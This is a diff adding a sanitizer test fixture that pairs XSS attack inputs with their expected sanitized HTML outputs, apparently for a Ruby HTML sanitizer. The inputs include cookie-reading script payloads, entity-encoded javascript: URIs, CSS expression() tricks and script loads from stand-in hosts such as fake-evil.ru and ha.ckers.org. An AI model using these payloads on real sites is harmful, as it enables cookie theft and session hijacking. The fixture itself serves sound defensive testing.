@@ -1,0 +1,476 @@
+<===> # Basic XSS
+<===> fragment.html
+test<script>alert(document.cookie)</script>
+<===> common.html
+test
+<===>
+
+
+# Pending because libxml2 behaviour changed in 2.9.13 (https://gitlab.gnome.org/GNOME/libxml2/-/issues/339)
+<===> pending:fragment.html
+<<<><<script src=http://fake-evil.ru/test.js>
+<===> pending:common.html
+&lt;&lt;&lt;&gt;&lt;
+<===>
+
+
+<===> fragment.html
+<script<script src=http://fake-evil.ru/test.js>>
+<===> common.html
+
+<===>
+
+
+<===> fragment.html
+<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<===> common.html
+
+<===>
+
+
+<===> fragment.html
+<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>
+<===>
+`
+<===> common.html
+
+<===>
+
+
+<===> fragment.html
+<BODY ONLOAD=alert('XSS')>
+<===> common.html
+
+<===>
+
+
+<===> fragment.html
+<iframe src=http://ha.ckers.org/scriptlet.html <
+<===> common.html
+
+<===>
+
+
+<===> fragment.html
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"">
+<===> common.html
+<===>
+
+
+<===> fragment.html
+<a onblur="alert(secret)" href="http://www.google.com">Google</a>
+<===> common.html
+<a href="http://www.google.com" rel="nofollow">Google</a>
+<===>
+
+
+# IMG attacks
+<===> fragment.html
+<img src="http://www.myspace.com/img.gif"/>
+<===> common.html
+<img src="http://www.myspace.com/img.gif"/>
+<===>
+
+
+<===> fragment.html
+<img src=javascript:alert(document.cookie)>
+<===> common.html
+<img src=""/>
+<===>
+
+
+<===> fragment.html
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<===> common.html
+<img src=""/>
+<===>
+
+
+<===> fragment.html
+<IMG SRC='&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041'>
+<===> common.html
+<img src=""/>
+<===>
+
+
+<===> fragment.html
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+<===> common.html
+<img src="jav%0Dascript:alert('XSS');"/>
+<===>
+
+
+<===> fragment.html
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<===> common.html
+<img src=""/>
+<===>
+
+
+<===> fragment.html
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<===> common.html
+<img src=""/>
+<===>
+
+
+<===> fragment.html
+<IMG SRC="javascript:alert('XSS')"
+<===> common.html
+<img src=""/>
+<===>
+
+
+<===> fragment.html
+<IMG LOWSRC="javascript:alert('XSS')">
+<===> common.html
+
+<===>
+
+
+<===> fragment.html
+<BGSOUND SRC="javascript:alert('XSS');">
+<===> common.html
+
+<===>
+
+
+# HREF attacks
+<===> fragment.html
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+<===> common.html
+
+<===>
+
+
+<===> fragment.html
+<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
+<===> common.html
+
+<===>
+
+
+<===> fragment.html
+<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
+<===> common.html
+
+<===>
+
+
+<===> fragment.html
+<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
+<===> common.html
+
+<===>
+
+
+<===> fragment.html
+<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
+<===> common.html
+<ul><li>XSS</li></ul>
+<===>
+
+
+<===> fragment.html
+<IMG SRC='vbscript:msgbox("XSS")'>
+<===> common.html
+<img src=""/>
+<===>
+
+
+<===> fragment.html
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
+<===> common.html
+
+<===>
+
+
+<===> fragment.html
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+<===> common.html
+
+<===>
+
+
+<===> fragment.html
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<===> common.html
+
+<===>
+
+
+<===> fragment.html
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<===> common.html
+
+<===>
+
+
+<===> fragment.html
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+<===> common.html
+
+<===>
+
+
+<===> fragment.html
+<TABLE BACKGROUND="javascript:alert('XSS')">
+<===> common.html
+<table/>
+<===>
+
+
+<===> fragment.html
+<TABLE><TD BACKGROUND="javascript:alert('XSS')">
+<===> common.html
+<table><td/></table>
+<===>
+
+
+<===> fragment.html
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<===> common.html
+<div/>
+<===>
+
+
+<===> fragment.html
+<DIV STYLE="width: expression(alert('XSS'));">
+<===> common.html
+<div/>
+<===>
+
+
+<===> fragment.html
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+<===> common.html
+
+<===>
+
+
+<===> fragment.html
+<STYLE>@im\\port'\\ja\\vasc\\ript:alert("XSS")';</STYLE>
+<===> common.html
+
+<===>
+
+
+<===> fragment.html
+<BASE HREF="javascript:alert('XSS');//">
+<===> common.html
+
+<===>
+
+
+<===> fragment.html
+<BaSe hReF="http://arbitrary.com/">
+<===> common.html
+
+<===>
+
+
+<===> fragment.html
+<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
+<===> common.html
+
+<===>
+
+
+<===> fragment.html
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
+<===> common.html
+
+<===>
+
+
+<===> fragment.html
+<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
+<===> common.html
+
+<===>
+
+
+<===> fragment.html
+<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+<===> common.html
+
+<===>
+
+
+<===> fragment.html
+<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<===> common.html
+
+<===>
+
+
+<===> fragment.html
+<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<===> common.html
+
+<===>
+
+
+<===> fragment.html
+<SCRIPT a=`>` SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>
+<===>
+
+<===> common.html
+
+<===>
+
+
+<===> fragment.html
+<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<===> common.html
+
+<===>
+
+
+<===> fragment.html
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<===> common.html
+PT SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;
+<===>
+
+
+<===> fragment.html
+<SCRIPT SRC=http://ha.ckers.org/xss.js
+<===> common.html
+
+<===>
+
+
+<===> fragment.html
+<div/style=&#92&#45&#92&#109&#111&#92&#122&#92&#45&#98&#92&#105&#92&#110&#100&#92&#105&#110&#92&#103:&#92&#117&#114&#108&#40&#47&#47&#98&#117&#115&#105&#110&#101&#115&#115&#92&#105&#92&#110&#102&#111&#46&#99&#111&#46&#117&#107&#92&#47&#108&#97&#98&#115&#92&#47&#120&#98&#108&#92&#47&#120&#98&#108&#92&#46&#120&#109&#108&#92&#35&#120&#115&#115&#41&>
+<===> common.html
+<div/>
+<===>
+
+
+<===> fragment.html
+<a href='aim: &c:\\windows\\system32\\calc.exe' ini='C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\pwnd.bat'>
+<===> common.html
+
+<===>
+
+
+<===> fragment.html
+<!--\n<A href=\n- --><a href=javascript:alert:document.domain>test-->
+<===> common.html
+test--&gt;
+<===>
+
+
+<===> fragment.html
+<a></a style="xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')">
+<===> common.html
+
+<===>
+
+
+# CSS attacks
+<===> fragment.html
+<div style="position:absolute">
+<===> common.html
+<div/>
+<===>
+
+
+<===> fragment.html
+<style>b { position:absolute }</style>
+<===> common.html
+
+<===>
+
+
+<===> fragment.html
+<div style="z-index:25">test</div>
+<===> common.html
+<div>test</div>
+<===>
+
+
+<===> fragment.html
+<style>z-index:25</style>
+<===> common.html
+
+<===>
+
+
+# Strings that cause issues for tokenizers
+<===> fragment.html
+<a - href="http://www.test.com">
+<===> common.html
+<a href="http://www.test.com" rel="nofollow"/>
+<===>
+
+
+# Comments
+<===> fragment.html
+text <!-- comment -->
+<===> common.html
+text
+<===>
+
+
+<===> fragment.html
+<div>text <!-- comment --></div>
+<===> common.html
+<div>text </div>
+<===>
+
+
+<===> fragment.html
+<div>text <!--[if IE]> comment <[endif]--></div>
+<===> common.html
+<div>text </div>
+<===>
+
+
+<===> fragment.html
+<div>text <!--[if IE]> <!--[if gte 6]> comment <[endif]--><[endif]--></div>
+<===> common.html
+<div>text </div>
+<===>
+
+
+<===> fragment.html
+<div>text <!--[if IE]> <!-- IE specific --> comment <[endif]--></div>
+<===> common.html
+<div>text  comment </div>
+<===>
+
+
+<===> fragment.html
+<div>text <!-- [ if lte 6 ]>\ncomment <[ endif\n]--></div>
+<===> common.html
+<div>text </div>
+<===>
+
+
+<===> fragment.html
+<div>text <![if !IE]> comment <![endif]></div>
+<===> common.html
+<div>text  comment </div>
+<===>
+
+
+<===> fragment.html
+<div>text <![ if !IE]> comment <![endif]></div>
+<===> common.html
+<div>text  comment </div>
+<===>
+
+
+<===> img-unicode/fragment.html
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<===> img-unicode/common.html
+<img src=""/>
+<===>
+
+<===> img-hex/fragment.html
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<===> img-hex/common.html
+<img src=""/>
+<===>
